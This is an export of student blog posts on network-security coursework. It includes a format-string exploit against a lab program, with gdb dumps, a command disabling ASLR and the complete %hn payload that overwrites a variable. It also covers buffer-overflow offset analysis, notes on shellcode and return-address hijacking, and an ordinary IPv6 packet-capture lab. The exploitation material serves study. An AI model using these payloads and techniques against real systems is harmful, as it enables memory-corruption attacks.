[{"content":"Welcome to AGA\u0026rsquo;s Blog. This is my first post.\nFor more information about this theme, check the documentation: https://stack.jimmycai.com/\n","date":"2023-10-18T17:55:36+08:00","image":"https://anonymity-0.github.io/posts/hello-world/cover_huf17888c423d4998eadaee1ca18c79e46_784100_120x120_fill_q75_box_smart1.jpg","permalink":"https://anonymity-0.github.io/posts/hello-world/","title":"Hello World"},{"content":"题目：在32位的ubuntu16.04运行环境下，对格式化漏洞程序vul_formatstr2.c，参照 12.2.4的方法，说明如何修改程序，将变量B的值改成0x5678CDEF。\n在Ubuntu 64位系统上，使用以下命令来安装gcc多架构编译器和32位库：\nsudo apt-get install gcc-multilib libc6-dev-i386\n在编译C程序时，使用-m32选项来生成32位的可执行文件。例如： gcc -m32 -o v2 vul_formatstr2.c\nazureuser@MyServer:~/hw$ gdb v2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 0x0000122d \u0026lt;+0\u0026gt;: endbr32 0x00001231 \u0026lt;+4\u0026gt;: push %ebp 0x00001232 \u0026lt;+5\u0026gt;: mov %esp,%ebp 0x00001234 \u0026lt;+7\u0026gt;: push %ebx 0x00001235 \u0026lt;+8\u0026gt;: sub $0x414,%esp 0x0000123b \u0026lt;+14\u0026gt;: call 0x1130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x00001240 \u0026lt;+19\u0026gt;: add $0x2d8c,%ebx 0x00001246 \u0026lt;+25\u0026gt;: mov %gs:0x14,%eax 0x0000124c \u0026lt;+31\u0026gt;: mov %eax,-0xc(%ebp) 0x0000124f \u0026lt;+34\u0026gt;: xor %eax,%eax 0x00001251 \u0026lt;+36\u0026gt;: movl $0x3435,-0x418(%ebp) 0x0000125b \u0026lt;+46\u0026gt;: movl $0x5657,-0x414(%ebp) 0x00001265 \u0026lt;+56\u0026gt;: movl $0x7879,-0x410(%ebp) 0x0000126f \u0026lt;+66\u0026gt;: lea -0x410(%ebp),%eax 0x00001275 \u0026lt;+72\u0026gt;: push %eax 0x00001276 \u0026lt;+73\u0026gt;: lea -0x414(%ebp),%eax 0x0000127c \u0026lt;+79\u0026gt;: push %eax 0x0000127d \u0026lt;+80\u0026gt;: lea -0x418(%ebp),%eax 0x00001283 \u0026lt;+86\u0026gt;: push %eax 0x00001284 \u0026lt;+87\u0026gt;: lea -0x1fc4(%ebx),%eax 0x0000128a \u0026lt;+93\u0026gt;: push %eax 0x0000128b \u0026lt;+94\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x00001290 \u0026lt;+99\u0026gt;: add $0x10,%esp 0x00001293 \u0026lt;+102\u0026gt;: mov -0x410(%ebp),%ecx 0x00001299 \u0026lt;+108\u0026gt;: mov -0x414(%ebp),%edx 0x0000129f \u0026lt;+114\u0026gt;: mov -0x418(%ebp),%eax 0x000012a5 \u0026lt;+120\u0026gt;: push %ecx 0x000012a6 \u0026lt;+121\u0026gt;: push %edx 0x000012a7 \u0026lt;+122\u0026gt;: push %eax 0x000012a8 \u0026lt;+123\u0026gt;: lea -0x1fab(%ebx),%eax 0x000012ae \u0026lt;+129\u0026gt;: push %eax 0x000012af \u0026lt;+130\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000012b4 \u0026lt;+135\u0026gt;: add $0x10,%esp 0x000012b7 \u0026lt;+138\u0026gt;: sub $0xc,%esp 0x000012ba \u0026lt;+141\u0026gt;: lea -0x1f94(%ebx),%eax 0x000012c0 \u0026lt;+147\u0026gt;: push %eax 0x000012c1 \u0026lt;+148\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 0x000012c6 \u0026lt;+153\u0026gt;: add $0x10,%esp 0x000012c9 \u0026lt;+156\u0026gt;: sub $0x8,%esp 0x000012cc \u0026lt;+159\u0026gt;: lea -0x40c(%ebp),%eax 0x000012d2 \u0026lt;+165\u0026gt;: push %eax 0x000012d3 \u0026lt;+166\u0026gt;: lea -0x1f7d(%ebx),%eax 0x000012d9 \u0026lt;+172\u0026gt;: push %eax 0x000012da \u0026lt;+173\u0026gt;: call 0x10e0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x000012df \u0026lt;+178\u0026gt;: add $0x10,%esp 0x000012e2 \u0026lt;+181\u0026gt;: sub $0xc,%esp 0x000012e5 \u0026lt;+184\u0026gt;: lea -0x40c(%ebp),%eax 0x000012eb \u0026lt;+190\u0026gt;: push %eax 0x000012ec \u0026lt;+191\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000012f1 \u0026lt;+196\u0026gt;: add $0x10,%esp 0x000012f4 \u0026lt;+199\u0026gt;: sub $0xc,%esp 0x000012f7 \u0026lt;+202\u0026gt;: lea -0x1f7a(%ebx),%eax 0x000012fd \u0026lt;+208\u0026gt;: push %eax 0x000012fe \u0026lt;+209\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 0x00001303 \u0026lt;+214\u0026gt;: add $0x10,%esp 0x00001306 \u0026lt;+217\u0026gt;: mov -0x410(%ebp),%ecx 0x0000130c \u0026lt;+223\u0026gt;: mov -0x414(%ebp),%edx 0x00001312 \u0026lt;+229\u0026gt;: mov -0x418(%ebp),%eax 0x00001318 \u0026lt;+235\u0026gt;: push %ecx 0x00001319 \u0026lt;+236\u0026gt;: push %edx 0x0000131a \u0026lt;+237\u0026gt;: push %eax 0x0000131b \u0026lt;+238\u0026gt;: lea -0x1f78(%ebx),%eax 0x00001321 \u0026lt;+244\u0026gt;: push %eax 0x00001322 \u0026lt;+245\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x00001327 \u0026lt;+250\u0026gt;: add $0x10,%esp 0x0000132a \u0026lt;+253\u0026gt;: nop 0x0000132b \u0026lt;+254\u0026gt;: mov -0xc(%ebp),%eax 0x0000132e \u0026lt;+257\u0026gt;: xor %gs:0x14,%eax 0x00001335 \u0026lt;+264\u0026gt;: je 0x133c \u0026lt;formatstr_vul+271\u0026gt; 0x00001337 \u0026lt;+266\u0026gt;: call 0x13f0 \u0026lt;__stack_chk_fail_local\u0026gt; 0x0000133c \u0026lt;+271\u0026gt;: mov -0x4(%ebp),%ebx 0x0000133f \u0026lt;+274\u0026gt;: leave 0x00001340 \u0026lt;+275\u0026gt;: ret End of assembler dump. (gdb) b *(formatstr_vul+191) Breakpoint 1 at 0x12ec (gdb) r Starting program: /home/azureuser/hw/v2 \u0026amp;A=0xffffcde0 \u0026amp;B=0xffffcde4 C=0xffffcde8. A=0x3435 B=0x5657 C=0x7879. Please enter a string: ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\nBreakpoint 1, 0x565562ec in formatstr_vul () (gdb) x/x $esp 0xffffcdd0: 0xffffcdec (gdb) p (0xbfffcdec-0xbfffcdd0)/4 $1 = 7\n因此，user_input的首地址为0xffffcdec，位于栈顶开始的第7个(4字 节）单元。\n关闭地址随机化机制: sudo sysctl -w kernel.randomize_va_space=0\n根据上面可知 \u0026amp;B=0xffffcde4=4294954468\n1 2 3 4 5 6 7 8 9 10 11 12 azureuser@MyServer:~/hw$ ./read2file Please enter an address. 4294954468 Please enter the format string: %08x.%08x.%08x.%08x.%08x.%08x.%08x. The string length is 39 azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring \u0026amp;A=0xffffce30 \u0026amp;B=0xffffce34 C=0xffffce38. A=0x3435 B=0x5657 C=0x7879. Please enter a string: ����ffffce3c.00005657.00007879.00003435.00005657.00007879.ffffcde4. New values A=0x3435 B=0x5657 C=0x7879. 变量B的地址送入堆栈，\u0026amp;B=0xffffce34 =4294954548\n编译 read2file2.c azureuser@MyServer:~/hw$ gcc -m32 -o read2file2 read2file2.c\n0xCDEF - 5*9 - 12 = 52662 0x5678 - 0xCDEF = -30583\n当尝试计算0x5678 - 0xCDEF时得到了负数，这是因为0x5678小于0xCDEF。为了解决这个问题，可以利用无符号整数的环绕性质。\n将负数-30583视为一个大的正数。具体来说，将-30583添加到2^16（即65536，因为%hn写入的是16位值）来得到一个正数：\n65536−30583=34953\n使用34953作为%hn的值来代替-30583。\n得到字符串： %08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x.\n命令行输入到文件mystring中\n1 2 3 4 5 6 azureuser@MyServer:~/hw$ ./read2file2 Please enter an address. 4294954548 Please enter the format string: %08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x. The string length is 70 将文件mystring作为输入重定向到漏洞程序，并将输出定向到 文件result.txt中：\n1 2 3 azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring \u0026gt; result.txt azureuser@MyServer:~/hw$ tail -n 1 result.txt New values A=0x3435 B=0x5678cdef C=0x7879. ","date":"2023-12-18T11:28:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/","title":"网络安全作业8"},{"content":"第九章 简述shellcode 的概念以及编写shellcode的步骤。\nshellcode是注入到目标进程中的二进制代码，其功能取决于编写者的意图。 编写shellcode要经过以下3个步骤： 编写简洁的能完成所需功能的C程序； 反汇编可执行代码，用系统功能调用代替函数调用，用汇编语言实现相同的功能； 提取出操作码，写成shellcode，并用C程序验证。 Linux环境下的shellcode为什么不调用libc中的库函数，而是利用系统调用？\n通过系统调用可以直接访问系统内核，具有非常强大的功能。 Shellcode 通常需要尽可能小，以便能够有效地注入到受限的内存空间或数据流中。直接使用系统调用比调用 libc 函数占用更少的空间，因为这避免了链接和加载整个库的开销。 在安全测试和渗透测试中，shellcode 需要尽可能隐蔽地执行。直接使用系统调用可能帮助绕过一些安全监测工具和防御机制，因为它们更多地关注对常见库函数的调用。 直接使用系统调用可以使shellcode更加独立和可移植。因为libc的版本和实现在不同的系统和环境中可能会有所不同，依赖于特定版本的libc函数可能会导致shellcode在某些环境下无法正常工作。 在攻击字符串中4字节的RET除了其取在攻击字符串中4字节的RET除了其取值范围要猜测准确外，还有什么需要考虑的（或者说有什么限制）？\n地址空间布局随机化，现代操作系统采用了地址随机化技术，缓冲区的起始地址是会动态变化的，必须在攻击串中放置足够多的NOP，以使得RET的取值范围足够大，才能猜测一个正确的RET。 RET指令的返回地址是函数返回时要跳转到的地址。如果返回地址指向了程序的不可执行代码区域，则攻击也将失败。 一些程序可能会使用栈保护来防止溢出攻击。例如，程序可能会设置栈的大小限制，或者使用栈保护指令来检查栈是否溢出。 RET指令的地址必须具有可写权限。如果RET指令的地址具有只读权限，则程序将无法修改该地址。 如果RET地址包含零字节，那么在某些情况下，程序可能会提前终止字符串的处理，这可能会阻止攻击的进行。 第十章 简述进程跳转攻击方法的基本思想\n从系统必须加载的动态链接库(如ntdll.dll，kernel32.dll)中寻找call esp和jmp esp指令，记录下该地址（溢出攻击的跳转地址），将该地址覆盖函数的返回地址，而将shellcode放在返回地址所在单元的后面。 这样就确保溢出后通过动态链接库中的指令而跳转到被注入到进程堆栈中的shellcode。 ","date":"2023-12-13T21:46:25+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/","title":"网络安全作业6"},{"content":"得分：10/10\nC程序homework08.c的主函数如下：\n1 2 3 4 5 6 7 8 9 10 11 12 int main(int argc, char * argv[]) { init_buf(Lbuffer, LEN); switch(argc) { case 1: f00(); break; case 2: f01(); break; case 3: f02(); break; default: f00(); break; } puts(\u0026#34;Done.\\nThe program exited normally.\u0026#34;); return 0; } 在32位的ubuntu16.04系统中用gcc -fno-stack-protector 编译该程序，得到的可执行程序见附件，通过gdb调试，对f00()、f01()和f02()进行分析： (1) 函数f00()、f01()和f02()是否导致段错误。 如果没有命令行参数（argc 等于 1，因为程序名本身也算一个参数），则执行函数 f00()。 如果有一个命令行参数（argc 等于 2），则执行函数 f01()。 如果有两个命令行参数（argc 等于 3），则执行函数 f02()。 如果有三个或更多的命令行参数，还是执行函数 f00()。 ![[Pasted image 20231122231415.png]] 函数foo(), 和 foo01() 都会导致段错误。\n如果函数f00()、f01()和f02()导致段错误，计算出被攻击的缓冲区首地址与函数的返回地址所在的栈地址的距离（即偏移OFFSET)，给出溢出后函数的返回地址(用16进制数表示)。 f00() ![[Pasted image 20231121150016.png]]\n打断点 函数入口处的堆栈指针esp指向的栈（地址为0xffffd1dc）保存了 函数f00()返回到调用函数(main)的地址（0x080485a8），即“函数的返回地址”\n记录堆栈指针esp的值，在此以A标记：A=$esp = 0xffffd1dc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 (gdb) x/x $esp 0xffffd1dc: 0x080485a8 (gdb) c Continuing. Breakpoint 2, 0x080484e9 in f00 () 1: x/i $eip =\u0026gt; 0x80484e9 \u0026lt;f00+24\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; (gdb) x/x $esp 0xffffd140: 0xffffd155 (gdb) 0xffffd144: 0x0804a060 (gdb) x/x 0x0804a060 0x804a060 \u0026lt;Lbuffer\u0026gt;: 0x44434241 令B = 0xffffd155，则offset=A-B=0xffffd1dc - 0xffffd155 =0x87=135。\n1 2 3 4 5 6 7 8 9 10 (gdb) c Continuing. Breakpoint 3, 0x080484f3 in f00 () 1: x/i $eip =\u0026gt; 0x80484f3 \u0026lt;f00+34\u0026gt;: ret (gdb) x/x $esp 0xffffd1dc: 0x49484746 (gdb) x/s $esp 0xffffd1dc: \u0026#34;FGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVW\u0026#34;... 执行ret之前的堆栈的内容可以推断执行ret后将跳到地址0x49484746去执行\nf01 执行程序\n1 azureuser@MyServer:~/hw$ gdb homework08 main\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 (gdb) disas main Dump of assembler code for function main: 0x0804856c \u0026lt;+0\u0026gt;: lea 0x4(%esp),%ecx 0x08048570 \u0026lt;+4\u0026gt;: and $0xfffffff0,%esp 0x08048573 \u0026lt;+7\u0026gt;: pushl -0x4(%ecx) 0x08048576 \u0026lt;+10\u0026gt;: push %ebp 0x08048577 \u0026lt;+11\u0026gt;: mov %esp,%ebp 0x08048579 \u0026lt;+13\u0026gt;: push %ebx 0x0804857a \u0026lt;+14\u0026gt;: push %ecx 0x0804857b \u0026lt;+15\u0026gt;: mov %ecx,%ebx 0x0804857d \u0026lt;+17\u0026gt;: sub $0x8,%esp 0x08048580 \u0026lt;+20\u0026gt;: push $0x400 0x08048585 \u0026lt;+25\u0026gt;: push $0x804a060 0x0804858a \u0026lt;+30\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 0x0804858f \u0026lt;+35\u0026gt;: add $0x10,%esp 0x08048592 \u0026lt;+38\u0026gt;: mov (%ebx),%eax 0x08048594 \u0026lt;+40\u0026gt;: cmp $0x2,%eax 0x08048597 \u0026lt;+43\u0026gt;: je 0x80485aa \u0026lt;main+62\u0026gt; 0x08048599 \u0026lt;+45\u0026gt;: cmp $0x3,%eax 0x0804859c \u0026lt;+48\u0026gt;: je 0x80485b1 \u0026lt;main+69\u0026gt; 0x0804859e \u0026lt;+50\u0026gt;: cmp $0x1,%eax 0x080485a1 \u0026lt;+53\u0026gt;: jne 0x80485b8 \u0026lt;main+76\u0026gt; 0x080485a3 \u0026lt;+55\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 0x080485a8 \u0026lt;+60\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485aa \u0026lt;+62\u0026gt;: call 0x80484f4 \u0026lt;f01\u0026gt; 0x080485af \u0026lt;+67\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485b1 \u0026lt;+69\u0026gt;: call 0x8048530 \u0026lt;f02\u0026gt; 0x080485b6 \u0026lt;+74\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485b8 \u0026lt;+76\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 0x080485bd \u0026lt;+81\u0026gt;: nop 0x080485be \u0026lt;+82\u0026gt;: sub $0xc,%esp 0x080485c1 \u0026lt;+85\u0026gt;: push $0x8048660 0x080485c6 \u0026lt;+90\u0026gt;: call 0x8048330 \u0026lt;puts@plt\u0026gt; 0x080485cb \u0026lt;+95\u0026gt;: add $0x10,%esp 0x080485ce \u0026lt;+98\u0026gt;: mov $0x0,%eax 0x080485d3 \u0026lt;+103\u0026gt;: lea -0x8(%ebp),%esp 0x080485d6 \u0026lt;+106\u0026gt;: pop %ecx 0x080485d7 \u0026lt;+107\u0026gt;: pop %ebx 0x080485d8 \u0026lt;+108\u0026gt;: pop %ebp 0x080485d9 \u0026lt;+109\u0026gt;: lea -0x4(%ecx),%esp 0x080485dc \u0026lt;+112\u0026gt;: ret End of assembler dump. f01()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 (gdb) disas f01 Dump of assembler code for function f01: 0x080484f4 \u0026lt;+0\u0026gt;: push %ebp 0x080484f5 \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x080484f7 \u0026lt;+3\u0026gt;: sub $0x508,%esp 0x080484fd \u0026lt;+9\u0026gt;: sub $0x8,%esp 0x08048500 \u0026lt;+12\u0026gt;: push $0x400 0x08048505 \u0026lt;+17\u0026gt;: lea -0x4fe(%ebp),%eax 0x0804850b \u0026lt;+23\u0026gt;: push %eax 0x0804850c \u0026lt;+24\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 0x08048511 \u0026lt;+29\u0026gt;: add $0x10,%esp 0x08048514 \u0026lt;+32\u0026gt;: sub $0x8,%esp 0x08048517 \u0026lt;+35\u0026gt;: lea -0x4fe(%ebp),%eax 0x0804851d \u0026lt;+41\u0026gt;: push %eax 0x0804851e \u0026lt;+42\u0026gt;: lea -0xfe(%ebp),%eax 0x08048524 \u0026lt;+48\u0026gt;: push %eax 0x08048525 \u0026lt;+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; 0x0804852a \u0026lt;+54\u0026gt;: add $0x10,%esp 0x0804852d \u0026lt;+57\u0026gt;: nop 0x0804852e \u0026lt;+58\u0026gt;: leave 0x0804852f \u0026lt;+59\u0026gt;: ret End of assembler dump. 设置断点\n1 2 3 4 5 6 (gdb) b*(f01+0) Breakpoint 1 at 0x80484f4 (gdb) b*(f01+49) Breakpoint 2 at 0x8048525 (gdb) b*(f01+59) Breakpoint 3 at 0x804852f 1 2 3 4 5 6 7 8 9 10 11 12 13 (gdb) display/i $eip 1: x/i $eip \u0026lt;error: No registers.\u0026gt; (gdb) x/i $eip No registers. (gdb) run 1 Starting program: /home/azureuser/hw/homework08 1 Breakpoint 1, 0x080484f4 in f01 () 1: x/i $eip =\u0026gt; 0x80484f4 \u0026lt;f01\u0026gt;: push %ebp (gdb) x/x $esp 0xffffd1cc: 0x080485af 记录堆栈指针esp的值，在此以A标记：A=$esp = 0xffffd1cc\n继续执行到下一个断点\n1 2 3 4 5 6 7 8 9 10 11 12 (gdb) c Continuing. Breakpoint 2, 0x08048525 in f01 () 1: x/i $eip =\u0026gt; 0x8048525 \u0026lt;f01+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; (gdb) x $esp 0xffffccb0: 0xffffd0ca (gdb) 0xffffccb4: 0xffffccca (gdb) x/x 0xffffccca 0xffffccca: 0x44434241 B=0xffffd0ca。\noffset=A-B= 0xffffd1cc - 0xffffd0ca =0x102=258。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (gdb) c Continuing. Breakpoint 3, 0x0804852f in f01 () 1: x/i $eip =\u0026gt; 0x804852f \u0026lt;f01+59\u0026gt;: ret (gdb) x/x $esp 0xffffd1cc: 0x42415a59 (gdb) x/s $esp 0xffffd1cc: \u0026#34;YZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOP\u0026#34;... (gdb) si 0x42415a59 in ?? () 1: x/i $eip =\u0026gt; 0x42415a59: \u0026lt;error: Cannot access memory at address 0x42415a59\u0026gt; (gdb) x/s $esp 0xffffd1d0: \u0026#34;CDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRST\u0026#34;... 返回地址变 为 0x42415a59\n其他（本次实验的一些其它尝试） 由于这个可执行文件是ubuntu16.04编译的，本身我的虚拟机系统是ubuntu18.04，一开始执行文件老是报错： 1 2 ~$ ./homework08 -bash: ./homework08: No such file or directory 查询之后发现不是文件不存在，是缺少需要的依赖，因为Ubuntu18.04默认去掉了32bit的library。\n解决方法\n1 sudo apt-get install lib32z1 之后就可以执行了。\n本身自己的电脑是mac m2芯片，一开始没尝试使用虚拟机而是docker在容器内去pull ubuntu的镜像来尝试实验：% docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --platform linux/386 -v \u0026quot;/Users/agq/Downloads/srcToStudent:/srcToStudent\u0026quot; --name=hw6 i386/ubuntu /bin/bash 发现能运行文件，并且可以显示段错误：\n但由于qemu天生不支持ptrace系统调用，而gdb正是依赖这个系统调用，所以无法进行调试（QEMU\u0026rsquo;s user-mode emulation does not support the ptrace system call）所以第二题就做不了，遂作罢。\n","date":"2023-11-24T15:55:04+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/","title":"网络安全作业5"},{"content":"基本操作 查看并记录 HostA 和 S 的 IPv6(ens5 scope:link) 地址 命令 ifconfig ens5。 命令解释 ifconfig是一个用于配置和显示Linux操作系统网络接口信息的命令。当执行ifconfig ens5命令时，它会显示ens5网络接口的配置信息，包括IP地址、子网掩码、MAC地址、数据包统计等。\nIPv6 连接： HostA 的终端 1 中执行 `sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5`。 HostA 的终端 2 中执行 `ping6 -c 1 S 的 IPv6(ens5 scope:link）地址%ens5`。 命令解释 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5 这个命令的作用是使用tcpdump工具来捕获指定主机HostA和另一台主机S之间通过ens5网络接口的IPv6通信数据包。其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\nping6 -c 1 S 的 IPv6(ens5 scope:link）地址%ens5 这个命令的作用是向指定的IPv6地址发送一个ICMPv6 Echo Request数据包，以测试与目标主机S的连通性。其中-c 1表示只发送一个数据包，S 的 IPv6(ens5 scope:link）地址表示目标主机S的IPv6地址，%ens5表示指定使用ens5网络接口发送数据包。\n结果 【实验要求】：此步骤需要记录终端 1 中抓到的 2 个报文数据，表明哪个是请求报文，哪个是回复报文。根据 IPv6 协议报文格式分析上述 tcpdump 抓包结果，要求画出 IPv6 以及 ICMPv6 的基本报头结构并将各个字段分别填入其中 (例如 IP 协议版本、源地址和目的地址、源端口和目的端口、报文含义等)。对这个报文的含义加以解释。\n第一个报文是请求报文，第二个报文是回复报文。\n第一个报文的IPv6报头如下：\n1 2 3 4 5 6 7 8 Version: 6 Traffic Class: 0 Flow Label: 0 Payload Length: 64 Next Header: ICMPv6 (58) Hop Limit: 64 Source Address: fe80::f816:3eff:fea7:a942 Destination Address: fe80::f816:3eff:fee7:f7b3 1 2 3 4 5 6 7 8 9 10 11 12 13 +-------------+----------------+------------+------------------+ | Version | Traffic Class | Flow Label | Payload Length | +-------------+----------------+------------+------------------+ | 6 | 0 | 0 | 64 | +-------------+----------------+------------+------------------+ | Next Header | Hop Limit | Source Address | +-------------+----------------+-------------------------------+ | 58 | 64 | fe80::f816:3eff:fea7:a942 | +---------------+----------------+-----------------------------+ | Destination Address | +--------------------------------------------------------------+ | fe80::f816:3eff:fee7:f7b3 | +--------------------------------------------------------------+ ICMPv6报头如下：\n1 2 3 4 5 Type: ICMPv6 Echo Request (128) Code: 0 Checksum: 0x158e Identifier: 0x0001 Sequence Number: 1 第二个报文的IPv6报头如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 +-------------+----------------+------------+------------------+ | Version | Traffic Class | Flow Label | Payload Length | +-------------+----------------+------------+------------------+ | 6 | 0 | 0 | 64 | +-------------+----------------+------------+------------------+ | Next Header | Hop Limit | Source Address | +-------------+----------------+-------------------------------+ | 58 | 64 | fe80::f816:3eff:fee7:f7b3 | +---------------+----------------+-----------------------------+ | Destination Address | +--------------------------------------------------------------+ | e80::f816:3eff:fea7:a942 | +--------------------------------------------------------------+ ICMPv6报头如下：\n1 2 3 4 5 Type: ICMPv6 Echo Reply (129) Code: 0 Checksum: 0x0506 Identifier: 0x0001 Sequence Number: 1 根据ICMPv6报文的类型和代码，可以判断第一个报文是ICMPv6 Echo Request报文，第二个报文是ICMPv6 Echo Reply报文。\nICMPv6 Echo Request报文用于请求对端发送Echo Reply报文。第一个报文的源地址是fe80::f816:3eff:fea7:a942，目的地址是fe80::f816:3eff:fee7:f7b3。序列号为1，表示这是第一个请求报文。\nICMPv6 Echo Reply报文用于响应ICMPv6 Echo Request报文。第二个报文的源地址是fe80::f816:3eff:fee7:f7b3，目的地址是fe80::f816:3eff:fea7:a942。序列号为1，表示这是对第一个请求报文的响应 上述tcpdump抓包结果表明，两个主机之间正在进行ICMPv6 Echo测试。\n路由器公告报文 路由器公告报文的目的地址为 IPv6 组播地址中的“全节点地址”，它的地址是FF02::1，可用 tcpdump 侦听路由器公告报文。HostA 中另开一个终端 3 用于侦听路由器公告报文，命令为： sudo tcpdump –vxn host ff02::1 -i ens5\n【实验要求】记录 HostA 的终端 3 中 tcpdump 抓包得到的数据。由于路由器公告报文的发送有一定地周期，因此这里可能需要等待较长时间，可以把终端 3 最小化继续进行其他实验，等有结果后记录抓包得到的数据。如仍未顺利抓到此包，也可以参考附录中的图 4 回答下述问题。根据 tcpdump 抓取到的报文数据说明路由器通告报文通告了哪些信息并简单解释网络中的其它主机将会如何使用这些信息？\n命令解释 这个命令的作用是使用tcpdump工具来捕获发送到IPv6组播地址ff02::1的数据包，该地址是IPv6中的所有节点组播地址。其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\n结果 根据 tcpdump 抓取到的报文数据，路由器通告报文通告了以下信息：\n源地址：fe80::f816:3eff:fee6:e881 目标地址：ff02::1 路由前缀：2001:db8:85a3::/64 生命周期 网络中的其它主机将会使用这些信息来进行以下操作：\n获取路由信息：主机可以使用路由前缀信息来构建自己的路由表，从而能够将数据包发送到目的网络。 自动配置地址：如果路由器通告了 M 比特为 1，则主机将使用 DHCPv6 服务来获取 IPv6 地址。 启用 IPv6 邻居发现：主机可以使用路由器通告中的链路层选项来启用 IPv6 邻居发现。 地址解析 地址解析的目的是通过对端的 IP 获取对端的 MAC 地址。由于地址解析过程会在数据发送前自动进行，因此需要先用 tcpdump 侦听，再 ping 对端，即可观察到NS 和 NA 报文。\nHostA 的终端 1 执行命令 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 -i ens5 HostA 的终端 2 执行命令 ping6 -c 1 HostB 的 IPv6(ens5 scope:link）地址%ens5。 命令解释 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 -i ens5 这个命令的作用是使用tcpdump工具来捕获发送到特定IPv6地址（HostA的IPv6地址，ens5接口，scope为link）的数据包，其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\nping6 -c 1 HostB 的 IPv6(ens5 scope:link）地址%ens5。 这个命令的作用是向指定的IPv6地址（HostB的IPv6地址，ens5接口，scope为link）发送一个ICMPv6数据包，-c 1表示只发送一个数据包。在IPv6地址后面加上%ens5是为了指定数据包通过ens5接口发送。\n结果 【实验要求】：记录 HostA 的终端 1 中观察到邻居请求 (NS) 和邻居通告 (NA) 报文。根据抓取到的报文数据说明邻居请求及邻居公告报文通告了哪些信息，这些信息有什么作用？\n从抓取到的报文数据来看，邻居请求 (NS) 报文通告了以下信息：\n源地址：fe80::f816:3eff:fea7:a942 目标地址：fe80::f816:3eff:fee7:1aea 请求类型：Who has 这些信息用于查询目标地址的邻居节点。\n邻居通告 (NA) 报文通告了以下信息：\n源地址：fe80::f816:3eff:fee7:1aea 目标地址：fe80::f816:3eff:fea7:a942 